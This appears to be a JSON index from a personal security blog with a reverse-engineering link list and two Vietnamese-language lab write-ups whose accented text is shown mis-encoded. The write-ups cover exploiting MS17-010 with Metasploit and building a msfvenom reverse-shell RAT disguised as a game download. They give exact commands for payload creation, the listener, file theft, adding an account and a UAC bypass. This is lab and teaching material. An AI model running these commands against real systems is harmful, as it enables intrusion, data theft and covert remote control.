https://anti-reversing.com/Downloads/Anti-Reversing/The_Ultimate_Anti-Reversing_Reference.pdf https://anti-debug.checkpoint.com/ https://www.youtube.com/watch?v=WlE8abc8V-4\u0026amp;feature=emb_title Anti-analysis https://www.malwarebytes.com/blog/news/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts https://www.oic-cert.org/en/download/Anti-Analysis techniques (OIC Talk).pdf https://www.cynet.com/attack-techniques-hands-on/malware-anti-vm-techniques/ https://www.youtube.com/watch?v=5NO-W3SVjak\u0026amp;feature=emb_title C++ Reversing Reversing C++ Virtual Functions Reversing C++ Windows Research If you want to get into Windows Research, then you need to learn Windows Internals.\nMy blog on Windows Internals Book on Windows Internals published by MS. Use it like a reference to learn about specific topics when needed Has the best video courses Windows Process Internals Windows Internals Overview Intro to Windows Internals Win32 programming with code examples Notes for Windows API programming Windows undocumented functions documentation Windows undocumented stuff\u0026rsquo;s documentation Windows Internals Book 7th edition Tools Full source code of ReactOS (open-source reimplementation of Windows) Explanation of key data structures used by device drivers, kernel, and HAL Take a look at more than 6000 Windows Undocumented structures Resources For Advanced Windows Development Understanding the EPROCESS data structure The NT Handle Table Anatomy of the thread suspension mechanism in Windows. Automatically generated diff of Windows structures Thread Scheduling Windows Kernel Callback Functions Decompilation of NT API functions Great blogs on Windows Internals https://secret.club wumb0.in voidsec.com https://poppopret.blogspot.com/?m=1 https://www.ragestorm.net/blogs/?cat=13 https://www.x86matthew.com https://www.tiraniddo.dev https://googleprojectzero.blogspot.com Others GuidedHacking Compiler Optimizations for Reverse Engineers. Reversing Stories: Updating the Undocumented ESTROBJ and STROBJ Structures for Windows 10 x64. Methodology for Static Reverse Engineering of Windows Kernel Drivers. What I Have Learned from Reverse Engineering Windows Containers. A Syscall Journey in the Windows Kernel. Symbolic Execution Video lecture on Symbolic Execution by MIT Video lectures on Symbolic Execution Youtube video covering the basics of z3 Learn z3 Course on Symbolic Analysis https://sat-smt.codes/SAT_SMT_by_example.pdf ","date":"2021-12-18T00:00:00Z","image":"/p/awesome-reverse-engineering/featured_huf18555801dbebbc9e5901ff2416a53a7_1886454_120x120_fill_box_smart1_3.png","permalink":"/p/awesome-reverse-engineering/","title":"Awesome Reverse Engineering"},{"content":"T√¨m hi·ªÉu v√† th·ª±c h√†nh t·∫•n c√¥ng v·ªõi l·ªó h·ªïng MS17-010 (CVE-2017-0143)\nPh√°t hi·ªán l·ªó h·ªïng MS17-010 1 2 Attacker: Kali Linux (192.168.47.128) Victim: Windows 7 (192.168.47.136) Tr√™n m√°y victim ping t·ªõi IP attacker (192.168.47.128) v√† t∆∞∆°ng t·ª± tr√™n m√°y attacker c≈©ng ping t·ªõi IP victim (192.168.47.136)\nTr√™n m√°y Attacker, s·ª≠ d·ª•ng l·ªánh sudo nmap -sV -sC -O 192.168.47.136 ƒë·ªÉ check c√°c port ƒëang m·ªü tr√™n m√°y victim c≈©ng nh∆∞ d·ªãch v·ª• v√† script tr√™n c√°c port n√†y\nT·∫°i ƒë√¢y th·∫•y port 445 ƒëang m·ªü (c·ªïng 445 ƒë∆∞·ª£c d√πng cho d·ªãch v·ª• Server Message Block - smb truy·ªÅn qua TCP)\nHo√†n to√†n c√≥ th·ªÉ th·∫•y script result bao g·ªìm smb-os-discovery\n\u0026ndash;\u0026gt; Scan l·ªó h·ªïng tr√™n giao th·ª© smb (t·∫°i port 445) b·∫±ng nmap: nmap --script vuln -p 445 192.168.47.136\nHo·∫∑c c√≥ th·ªÉ s·ª≠ d·ª•ng l·ªánh nmap -vv -Pn -T4 --script vuln 192.168.47.136 ƒë·ªÉ qu√©t full c√°c c·ªïng ƒëang m·ªü lu√¥n c≈©ng ƒë∆∞·ª£c\n(T: t∆∞·ª£ng tr∆∞ng cho t·ªëc ƒë·ªô qu√©t \u0026ndash;\u0026gt; c√≥ 6 m·ªëc qu√©t t·ª´ 0 ƒë·∫øn 5\n1 paranoid; sneaky; polite, nomal, aggressive, insane \u0026ndash;\u0026gt; t·ªëc ƒë·ªô c√†ng th·∫•p ƒë·ªô an to√†n c√†ng cao, m·ª©c 3 s·∫Ω l√† bthg, thi CTF d√πng m·ª©c 4, th·ª±c t·∫ø d√πng m·ª©c 1 (tr√°nh b·ªã h·ªá th·ªëng IDS ph√°t hi·ªán))\nIDS: Instrusion Detection System (H·ªá th·ªëng ph√°t hi·ªán x√¢m nh·∫≠p)\nT·ª´ nh·ªØng d·ªØ li·ªáu tr√™n, ta ho√†n to√†n c√≥ th·ªÉ x√°c ƒë·ªãnh ƒë∆∞·ª£c t·ªìn t·∫°i l·ªó h·ªïng b·∫£o m·∫≠t MS17-010\nKhai th√°c l·ªó h·ªïng b·∫£o m·∫≠t MS17-010 Th·ª±c hi·ªán truy c·∫≠p v√†o m√°y victim Th·ª±c hi·ªán m·ªü Metasploit Framework v√† search ms17 ƒë·ªÉ t√¨m c√°c module li√™n quan\nexploit/windows/smb/ms17_010_eternalblue\nSau khi set module v√† rhost (remote), run ƒë·ªÉ thi·∫øt l·∫≠p SMB\nuse 0 \u0026ndash;\u0026gt; set rhost 192.168.47.136 (remote) \u0026ndash;\u0026gt; run\nƒê·∫øn ƒë√¢y l√† ƒë√£ khai th√°c th√†nh c√¥ng l·ªó h·ªïng MS17-010 ƒë·ªÉ truy c·∫≠p v√†o m√°y victim\nTruy·ªÅn RAT C√°ch t·∫°o ra 1 ph·∫ßn m·ªÅm RAT th√¨ kh√¥ng kh√°c g√¨ nh∆∞ b√†i RAT (Remote Access Trojan) g√¨ l·∫Øm, ch·ªâ c·∫ßn ƒë·ªÉ √Ω h·ªá ƒëi√™u h√†nh ch√∫ng ta s·ª≠ d·ª•ng l√†m victim trong ch·ªß ƒë·ªÅ n√†y l√† Windows 7 (x64) th√¨ ch√∫ng ta c·∫ßn t·∫°o ra 1 file RAT t∆∞∆°ng ·ª©ng x64\nmsfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lhost=192.168.199.139 lport=4444 -f exe --platform window \u0026gt; mal.exe Truy·ªÅn RAT qua m√°y victim b·∫±ng l·ªánh upload + file\nS·ª≠ d·ª•ng l·ªánh execute -f mal.exe -i -H ƒë·ªÉ ch·∫°y file tr√™n m√°y victim\nho·∫∑c c√≥ th·ªÉ truy c·∫≠p v√†o shell v√† g·ªçi file ƒë·ªÉ ch·∫°y\nCheck trong Task Manager ƒë·ªÉ th·∫•y file mal.exe ƒëang ch·∫°y\nK·∫øt lu·∫≠n L·ªó h·ªïng b·∫£o m·∫≠t MS17-010 (CVE-2017-010) ƒë∆∞·ª£c ƒë√°nh gi√° ·ªü m·ª©c ƒë·ªô Critical (Nguy k·ªãch) v√¨ ho√†n to√†n c√≥ th·ªÉ th·ª±c thi t·ª´ xa\nH·ªá ƒëi·ªÅu h√†nh b·ªã ·∫£nh h∆∞·ªüng b·ªüi l·ªó h·ªïng b·∫£o m·∫≠t MS17-010 Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8.1, Windows Server 2012, 2012 R2, Windows RT 8.1, Windows 10, Windows Server 2016\n","date":"2021-12-12T00:00:00Z","image":"/p/ms17-010-cve-2017-0143/featured-image_hu69e7e51dfaf03e795a7783d1f5e83771_247169_120x120_fill_box_smart1_3.png","permalink":"/p/ms17-010-cve-2017-0143/","title":"MS17-010 (CVE-2017-0143)"},{"content":"T√¨m hi·ªÉu v√† th·ª±c h√†nh t·∫•n c√¥ng v·ªõi Remote Access Trojan\nRAT l√† g√¨? RAT (Remote Access Trojan) l√† m·ªôt lo·∫°i ph·∫ßn m·ªÅm ƒë·ªôc h·∫°i c√≥ th·ªÉ gi√∫p 1 tin t·∫∑c c√≥ th·ªÉ chi·∫øm quy·ªÅn v√†o c√°c ƒëi·ªán tho·∫°i ho·∫∑c m√°y t√≠nh khi b·ªã l√¢y nhi·ªÖm.\nRAT ƒë∆∞·ª£c s·ª≠ d·ª•ng h·∫ßu h·∫øt cho vi·ªác hack c·ªßa c√°c tin t·∫∑c v√† ƒë∆∞·ª£c c√†i tr√™n m√°y c·ªßa n·∫°n nh√¢n (victim). N·∫øu ƒë∆∞·ª£c m√£ ho√° th√¨ RAT s·∫Ω ƒë∆∞·ª£c ·∫©n ƒëi v√† r·∫•t kh√≥ cho c√°c ph·∫ßn m·ªÅm di·ªát virus ph√°t hi·ªán ƒë∆∞·ª£c ch√∫ng. B·ªüi v√¨ v·∫≠y c√†ng khi·∫øn vi·ªác lo·∫°i b·ªè tr·ªü n√™n kh√≥ khƒÉn c≈©ng nh∆∞ c√°c tin t·∫∑c d·ªÖ d√†ng ki·ªÉm so√°t thi·∫øt b·ªã c·ªßa n·∫°n nh√¢n h∆°n.\nC√°c ph·∫ßn m·ªÅm RAT nguy hi·ªÉm ·ªü ch·ªó, hi·ªán nay n√≥ ƒëang ƒë∆∞·ª£c rao b√°n v·ªõi t·∫ßm gi√° t·ª´ v√†i ch·ª•c ƒë·∫øn v√†i trƒÉm ƒë√¥ la m·ªπ n√™n vi·ªác x·ª≠ l√Ω ch√∫ng tr√™n di·ªán r·ªông c≈©ng tr·ªü n√™n kh√≥ khƒÉn h∆°n.\nKhi n·∫°n nh√¢n b·ªã nhi·ªÖm RAT, tin t·∫∑c c√≥ th·ªÉ l√†m ƒë∆∞·ª£c g√¨? L·∫•y ƒë∆∞·ª£c to√†n b·ªô d·ªØ li·ªáu (Data), password l∆∞u tr√™n m√°y c·ªßa n·∫°n nh√¢n Truy c·∫≠p camera (webcam), hi·ªÉn th·ªã v·ªã tr√≠, truy c·∫≠p mic ƒë·ªÉ nghe m√¥i tr∆∞·ªùng xung quanh, xem tr·ª±c ti·∫øp m√†n h√¨nh c·ªßa n·∫°n nh√¢n (victim) C√≥ quy·ªÅn truy c·∫≠p danh b·∫°, danh s√°ch cu·ªôc g·ªçi ho·∫∑c tin nh·∫Øn C√≥ th·ªÉ c√†i th√™m c√°c virus (c√≥ th·ªÉ l√† lo·∫°i kh√°c v√†o m√°y n·∫°n nh√¢n) C√≥ th·ªÉ l·ª£i d·ª•ng quy·ªÅn ƒëi·ªÅu khi·ªÉn m√°y c·ªßa n·∫°n nh√¢n ƒë·ªÉ th·ª±c hi·ªán c√°c h√†nh vi ph·∫°m t·ªôi kh√°c \u0026ndash;\u0026gt; T·∫•t c·∫£ c√°c quy·ªÅn c·ªßa n·∫°n nh√¢n l√†m ƒë∆∞·ª£c tr√™n thi·∫øt b·ªã c·ªßa h·ªç, tin t·∫∑c c≈©ng ƒë·ªÅu c√≥ th·ªÉ l√†m ƒë∆∞·ª£c v·ªõi m√°y c·ªßa h·ªç (n·∫°n nh√¢n)\nY√™u c·∫ßu m√¥ ph·ªèng S·ª≠ d·ª•ng 1 c√¥ng c·ª• RAT (Remote Access Trojan) b·∫•t k√¨ [M√¥ h√¨nh bao g·ªìm 1 m√°y attacker v√† 1 m√°y victim]. Th·ª±c hi·ªán c√†i ƒë·∫∑t RAT v√†o m√°y t√≠nh victim sau ƒë√≥ th·ª±c hi·ªán c√°c h√†nh vi:\nL·∫•y file d·ªØ li·ªáu v·ªÅ (c√≥ th·ªÉ d√πng 1 file gi·∫£ l·∫≠p trong h·ªá th·ªëng) T·∫°o t√†i kho·∫£n ng∆∞·ªùi d√πng c√≥ quy·ªÅn administrator L∆∞u √Ω: S·ª≠ d·ª•ng giao di·ªán d√≤ng l·ªánh ho·∫∑c giao di·ªán c·ªßa c√¥ng c·ª• RAT (l∆∞u √Ω kh√¥ng s·ª≠ d·ª•ng c√¥ng c·ª• Remote Desktop ho·∫∑c SSH) Th·ª±c hi·ªán m√¥ ph·ªèng M√¥ h√¨nh t·∫•n c√¥ng Bao g·ªìm 1 m√°y attacker l√† Kali Linux v√† 1 m√°y victim (trong b√†i n√†y m√¨nh s·ª≠ d·ª•ng Windows XP v√† Windows 7)\nC√¥ng c·ª• RAT Ch·ªçn c√¥ng c·ª• msfvenom (Metasploit Framework) ƒë·ªÉ s·ª≠ d·ª•ng cho vi·ªác t·∫•n c√¥ng m√¥ ph·ªèng n√†y\nStart apache web server t·ª´ ph√≠a Kali Linux (attacker) b·∫±ng sudo apache2ctl start v√† ti·∫øp theo l√† check IP t·ª´ Kali Linux\nV√† nh·ªØng g√¨ hi·ªÉn th·ªã tr√™n IP n√†y l√† to√†n b·ªô d·ªØ li·ªáu c√≥ trong var/www/html b√™n ph√≠a Kali Linux, m√¨nh ƒë√£ t·∫°o 1 web gi·∫£ m·∫°o t·∫£i game\nT·∫°o 1 payload v√† l∆∞u v√†o file game.exe m√† m√¨nh s·∫Ω d√πng b·∫±ng l·ªánh (T·∫°o file malware)\n1 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.47.128 lport=443 -f exe -o game.exe Gi·∫£i th√≠ch shell:\n-p l√† s·ª≠ d·ª•ng payload windows/meterpreter/reverse_tcp\nlhost l√† IP address c·ªßa m√°y attacker (l t∆∞·ª£ng tr∆∞ng cho local)\nlport l√† c·ªïng c·ªßa m√°y attacker\n-f l√† format c·ªßa file malware (·ªü ƒë√¢y m√¨nh ƒë·ªÉ l√† exe)\n-o File output th·ª±c t·∫ø (m√¨nh ƒë·ªÉ t√™n c·ªßa file)\nT·∫°i ƒë√¢y d√πng 1 m√°y Windows XP ƒë·ªÉ l√†m m√°y victim v√† truy c·∫≠p v√†o ƒë·ªãa ch·ªâ IP tr√™n ƒë√£ l·∫•y t·ª´ Kali Linux ·ªü tr√™n ti·∫øn h√†nh truy c·∫≠p v√†o apache web server v√† v√†o m·ª•c game ƒë√£ ch·ª©a web gi·∫£ m·∫°o c·ªßa m√¨nh. V√† sau khi t·∫£i v·ªÅ th√¨ s·∫Ω ch·ª©a file game.exe\nS·ª≠ d·ª•ng giao di·ªán c·ªßa msf \u0026ndash;\u0026gt; msfconsole (Metasploit framework) v√† v√†o vi·ªác\nNh·∫≠p l·∫ßn l∆∞·ª£t c√°c d√≤ng l·ªánh ƒë·ªÉ c√†i ƒë·∫∑t cho msf\n1 2 3 4 5 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 192.168.47.128 set lport 443 run C√°c l·ªánh c√†i cho Metasploit\nV√† sau khi m√°y victim ch·∫°y n√≥, msf s·∫Ω t·ª± hi·ªán l√™n k·∫øt n·ªëi\nNh·∫≠p help ƒë·ªÉ bi·∫øt th√™m nhi·ªÅu l·ªánh v√† c√¥ng d·ª•ng trong ƒë√≥ (m√¨nh kh√¥ng ƒë·ªÉ √Ω n√™n ƒë√£ m·∫•t r·∫•t nhi·ªÅu th·ªùi gian s·ª≠ d·ª•ng shell b√™n victim ƒë·ªÉ g·ª≠i t√†i li·ªáu)\nTh·ª±c hi·ªán h√†nh vi 1: L·∫•y file t√†i li·ªáu v·ªÅ (m·ªôt file gi·∫£ l·∫≠p b·∫•t k·ª≥ trong h·ªá th·ªëng)\nGi·∫£ s·ª≠ m√°y victim ƒëang c√≥ 1 file txt ch·∫≥ng h·∫°n ·ªü ƒë√¢y m√¨nh ƒë·ªÉ l√† file dinhthaison.txt v√† m√¨nh ƒë·ªÉ lu√¥n ·ªü Desktop cho nhanh nh√©\nth√¨ v·ªõi l·ªánh dir, m√¨nh ƒë√£ qu√©t ƒë∆∞·ª£c c√°c file ƒëang t·ªìn t·∫°i ngo√†i Desktop v√† c√≥ t·ªìn t·∫°i file dinhthaison.txt\nSau ƒë√≥ ch·ªâ c·∫ßn nh·∫≠p l·ªánh download dinhthaison.txt ƒë·ªÉ t·∫£i v·ªÅ th√¥i\nTh·ª±c hi·ªán h√†nh vi 2: T·∫°o 1 t√†i kho·∫£n ng∆∞·ªùi d√πng c√≥ quy·ªÅn administrator.\nS·ª≠ d·ª•ng l·ªánh shell ƒë·ªÉ truy c·∫≠p v√†o cmd c·ªßa m√°y victim, check user b·∫±ng l·ªánh net user, ·ªü ƒë√¢y ta th·∫•y m·ªõi c√≥ t√†i kho·∫£n ban ƒë·∫ßu c·ªßa m√°y l√† SUPPORT_388945a0\nTi·∫øn h√†nh th√™m t√†i kho·∫£n m·ªõi b·∫±ng c√°ch nh·∫≠p l·ªánh net user newaccount dinhthaison /add, trong ƒë√≥ newaccount l√† t√™n ng∆∞·ªùi d√πng, c√≤n dinhthaison l√† password\nNgo√†i l·ªÅ V·ªÅ RAT l·∫ßn n√†y, sau khi th·ª≠ v·ªõi windows 7 th√¨ c√≥ tr∆∞·ªùng h·ª£p kh√¥ng ƒë∆∞·ª£c c·∫•p quy·ªÅn ad trong khi nh·∫≠p meterpreter (v√† l√Ω do ch√≠nh l√† UAC ch∆∞a ƒë∆∞·ª£c bypass)\nNh∆∞ng khi m√¨nh th·ª±c thi th√¨ ho√†n to√†n kh√¥ng g·∫∑p ph·∫£i v·∫•n ƒë·ªÅ n√†y v√¨ c√≥ l·∫Ω windows XP kh√¥ng c√≥ UAC\nN·∫øu g·∫∑p UAC t·ª´ c√°c ƒë·ªùi windows 7 tr·ªü l√™n th√¨ sao? V·∫≠y th√¨ m√¨nh s·∫Ω bypass UAC ngay trong m√°y attacker. ƒê·∫ßu ti√™n s·∫Ω l√† check ng∆∞·ªùi d√πng b·∫±ng getuid\nV·ªõi m·ªói th√¥ng tin nhu n√†y th√¨ ch∆∞a ch·∫Øc ch·∫Øn ƒë∆∞·ª£c g√¨, c√≥ l·∫Ω n√™n th·ª≠ ti·∫øp b·∫±ng getsystem\nV·∫≠y l√† ƒë√£ b·ªã fail. S·ª≠ d·ª•ng getsystem -h ƒë·ªÉ hi·ªÉn th·ªã m·ª•c help\nSau khi s·ª≠ d·ª•ng getsystem -t 1 tr·∫£ v·ªÅ Access is denied\nV·∫≠y th√¨ s·∫Ω ti·∫øn h√†nh bypass UAC ƒë·ªÉ c√≥ quy·ªÅn truy c·∫≠p cho RAT, b·∫±ng c√°ch s·ª≠ d·ª•ng module t·ª´ Metasploit ƒë·ªÉ bypass t√≠nh nƒÉng UAC tr√™n Windows.\nƒê·∫ßu ti√™n th√¨ m√¨nh s·∫Ω c·∫ßn l√†m background cho session\nTi·∫øp theo s·∫Ω s·ª≠ d·ª•ng l·ªánh use exploit/windows/local/bypassuac (l·ªánh n√†y c√≥ th·ªÉ t√¨m ki·∫øm b·∫±ng vi·ªác search uac trong Metasploit) sau ƒë√≥ check options\nD·ªÖ th·∫•y exploit target l√† windows x86 \u0026ndash;\u0026gt; nh·∫≠p show targets ƒë·ªÉ xem nh·ªØng m·ª•c ti√™u\nV·∫≠y th√¨ ƒë·∫øn ƒë√¢y ch√∫ng ta s·∫Ω set target c≈©ng nh∆∞ session\nSau b∆∞·ªõc n√†y ch√∫ng ta c√≥ th·ªÉ run ƒë·ªÉ bypass UAC\nSau khi check getuid v√† getsystem ƒë·ªÅu ƒë√£ ra nh·ªØng th·ª© ch√∫ng ta c·∫ßn\nV·∫≠y l√† ƒë√£ th√†nh c√¥ng v∆∞·ª£t qua ƒë∆∞·ª£c UAC v√† ƒë√£ c√≥ quy·ªÅn truy c·∫≠p h·ªá th·ªëng\n\u0026ndash;\u0026gt; Ho√†n th√†nh challenge t√¨m hi·ªÉu v√† s·ª≠ d·ª•ng RAT (Remote Access Trojan)\nC√°ch ph√≤ng tr√°nh RAT v√† t·ª± b·∫£o v·ªá ch√≠nh m√¨nh tr∆∞·ªõc RAT Kh√¥ng s·ª≠ d·ª•ng c√°c ph·∫ßn m·ªÅm Crack ho·∫∑c kh√¥ng download t·ª´ 1 ngu·ªìn kh√¥ng ƒë√°ng tin c·∫≠y n√†o Kh√¥ng m·ªü mail kh√¥ng x√°c ƒë·ªãnh ho·∫∑c m·ªü file ƒë√≠nh k√®m t·ª´ 1 mail kh√¥ng x√°c ƒë·ªãnh Lu√¥n c·∫≠p nh·∫≠t c√°c b·∫£n v√° ho·∫∑c ph·∫ßn m·ªÅm m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c c·ªßa ph·∫ßn m·ªÅm ƒë√≥ (c≈©ng nh∆∞ h·ªá ƒëi·ªÅu h√†nh) Thao t√°c c√°c h√†nh ƒë·ªông kh√¥ng ƒë√°ng tin c·∫≠y tr√™n m√°y ·∫£o V·ªÅ Windows ƒë·ªùi cao h∆°n ƒê·ªëi v·ªõi h·ªá ƒëi·ªÅu h√†nh Windows ƒë·ªùi cao h∆°n, s·∫Ω c·∫ßn ph·∫£i t·∫Øt t∆∞·ªüng l·ª≠a, window defender v√† t·∫•t nhi√™n c≈©ng s·∫Ω ph·∫£i bypass UAC m·ªõi c√≥ th·ªÉ s·ª≠ d·ª•ng ƒë∆∞·ª£c v√† s·ª± m√¥ ph·ªèng n√†y c√≥ l·∫Ω ch∆∞a th·ª±c s·ª± kh·∫£ thi v·ªõi ngo√†i ƒë·ªùi trong th·ªùi ƒëi·ªÉm hi·ªán t·∫°i.\n","date":"2021-12-08T00:00:00Z","image":"/p/remote-access-trojan-rat/featured-image_hu5d81229f77d95ff6b8ef09734888b519_23752_120x120_fill_box_smart1_3.png","permalink":"/p/remote-access-trojan-rat/","title":"Remote Access Trojan (RAT)"}]